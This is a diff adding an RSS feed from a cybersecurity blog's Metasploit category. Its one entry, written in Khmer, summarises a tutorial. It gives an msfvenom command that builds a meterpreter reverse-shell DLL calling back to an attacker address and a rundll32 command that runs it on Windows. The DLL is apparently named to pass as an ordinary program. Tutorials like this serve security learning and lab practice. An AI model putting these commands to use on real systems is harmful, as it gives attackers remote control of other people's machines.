@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Metasploit on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/categories/metasploit/</link>
+    <description>Recent content in Metasploit on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Tue, 01 Nov 2022 21:01:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Execute DLL Payloads</title>
+        <link>https://thiklab.com/en/posts/exec-dll-payload/</link>
+        <pubDate>Tue, 01 Nov 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 01 Nov 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/exec-dll-payload/</guid>
+        <description>Generate DLL Payload នៅក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច (Kali, Parrot) សូមបើកផ្ទាំង Terminal ហើយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
+1  kali@1337:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b &amp;#39;\x00\xff&amp;#39; -f dll &amp;gt; idm.dll   Execute DLL ឥឡូវចូលទៅកាន់ម៉ាស៊ីនវីនដូ ហើយវាយពាក្យបញ្ជាដូចខាងក្រោម៖
+1  cmd&amp;gt; c:\Windows\System32\rundll32.exe c:\Users\Zyzz\Desktop\idm32.dll,xoxo   ល្បិចក្នុងការដំណើរការ DLL គឺស្ថិតនៅត្រង់សញ្ញា &amp;quot;,&amp;quot; ហើយបញ្ចប់ដោយតួរអក្សរពីក្រោយ (ដាក់អ្វីក៏បាន)។
+Get Reverse Shell តស់! ត្រលប់ទៅកាន់ផ្ទាំង Terminal វិញនោះយើងនឹងទទួលបាន Reverse Shell ពីវីនដូ៕</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>reverse-shell</category>
+            
+          
+        
+        
+          
+            
+              <category>Metasploit</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
